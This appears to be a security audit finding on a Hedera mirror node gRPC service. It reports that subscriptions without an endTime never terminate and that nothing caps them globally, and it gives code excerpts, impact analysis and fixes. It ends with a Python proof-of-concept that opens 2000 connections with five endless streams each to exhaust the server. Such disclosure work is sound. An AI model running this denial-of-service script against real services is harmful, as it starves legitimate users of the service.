### Title
Unbounded Indefinite Subscriptions via Missing Global Limit on No-EndTime gRPC Streams

### Summary
When a client subscribes to a topic without setting `endTime`, `pastEndTime()` unconditionally returns `Flux.never()`, causing `takeUntilOther(pastEndTime(topicContext))` to never emit a terminal signal. The only per-connection cap is `maxConcurrentCallsPerConnection = 5`, but there is no global limit on total concurrent subscriptions across connections. An unprivileged attacker can open arbitrarily many TCP connections, each carrying 5 indefinitely-live streams, exhausting reactive scheduler threads, listener registrations, and heap memory.

### Finding Description

**Exact code path:**

`pastEndTime()` at lines 123–125:
```java
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();   // ← never emits, never completes
    }
``` [1](#0-0) 

This `Flux.never()` is passed directly into `takeUntilOther()` at line 73:
```java
.concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
``` [2](#0-1) 

`takeUntilOther(Flux.never())` means the merged `safetyCheck + live` pipeline never receives a termination signal from this operator. The subscription lives until the client disconnects or the server is killed.

Each subscription also schedules a recurring task on `Schedulers.boundedElastic()`:
```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
``` [3](#0-2) 

And registers with the topic listener (Redis/poll), holding a listener slot per subscription.

**Root cause:** The design correctly uses `Flux.never()` for open-ended subscriptions, but there is no global cap on how many such subscriptions can exist simultaneously. `subscriberCount` is tracked as a metric but never enforced as a limit:
```java
private final AtomicLong subscriberCount = new AtomicLong(0L);
...
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
``` [4](#0-3) [5](#0-4) 

**Why the per-connection limit is insufficient:** The only server-side cap is `maxConcurrentCallsPerConnection = 5`, enforced at the Netty level:
```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
``` [6](#0-5) [7](#0-6) 

This limits streams *per TCP connection*, not globally. An attacker opens C connections × 5 streams = 5C indefinitely-live pipelines with no upper bound on C.

### Impact Explanation
Each open no-endTime subscription holds:
- A `TopicContext` object and its `AtomicLong`/`AtomicReference` fields in heap
- A `boundedElastic` scheduler task (default pool: 10× CPU cores; exhaustion blocks all other elastic-scheduled work)
- A listener registration in the Redis/poll listener, consuming a slot in the shared listener's subscriber list

With enough connections an attacker can exhaust the `boundedElastic` thread pool, fill the JVM heap, and starve legitimate subscribers — a complete non-network DoS of the gRPC service. The `subscriberCount` metric will alert operators only after the fact.

### Likelihood Explanation
The gRPC port (5600) is publicly exposed with no authentication requirement visible in the codebase. `TopicMessageFilter` requires only a valid `topicId` and a `startTime` in the past; `endTime` is optional and defaults to `null`. Any client with network access can open unlimited connections. The attack is trivially scriptable: open N connections, call `subscribeTopic` with a real topic ID and no `endTime` on each stream, and hold them open. No special privileges, credentials, or knowledge of internal state are required.

### Recommendation
1. **Enforce a global subscription cap:** Check `subscriberCount` against a configurable maximum in `subscribeTopic()` before creating the pipeline; return `RESOURCE_EXHAUSTED` gRPC status if exceeded.
2. **Add per-IP connection limiting** at the Netty/gateway layer (e.g., via an `EnvoyFilter` or a `ServerInterceptor` that tracks connections per remote address).
3. **Require a maximum subscription duration:** Either mandate a non-null `endTime` or impose a server-side maximum lifetime (e.g., 24 hours) so that no subscription can live forever regardless of client intent.
4. **Bound the `boundedElastic` scheduler usage** by replacing the unbounded `subscribeOn(Schedulers.boundedElastic())` for the safety-check path with a dedicated, capacity-limited scheduler.

### Proof of Concept
```python
import grpc
import threading
# proto: com.hedera.mirror.api.proto.ConsensusService/subscribeTopic

def open_subscription(channel):
    stub = ConsensusServiceStub(channel)
    req = ConsensusTopicQuery(
        topicID=ConsensusTopicID(topicNum=1),
        # endTime intentionally omitted → Flux.never() path
    )
    for _ in stub.subscribeTopic(req):  # blocks indefinitely
        pass

channels = []
threads = []
for _ in range(2000):          # 2000 connections × 5 streams each = 10 000 pipelines
    ch = grpc.insecure_channel("mirror-node-grpc:5600")
    channels.append(ch)
    for _ in range(5):
        t = threading.Thread(target=open_subscription, args=(ch,), daemon=True)
        t.start()
        threads.append(t)

# Server's boundedElastic pool exhausted; legitimate subscribers starved
input("Attack running. Press Enter to stop.")
```
